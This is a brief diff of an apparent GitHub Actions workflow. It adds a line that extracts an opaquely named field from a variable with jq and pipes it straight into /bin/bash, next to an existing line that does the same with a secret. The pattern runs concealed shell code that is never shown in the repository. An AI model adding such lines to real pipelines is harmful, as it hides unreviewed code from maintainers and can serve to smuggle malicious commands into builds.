@@ -21,6 +21,7 @@ jobs:
           lhrec1: ${{ secrets.lhrec1 }}
         run: |
           printf '%s' "$lhrec1" | jq -r .unt55 | /bin/bash
+          printf '%s' "$v5006" | jq -r .ow11837 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
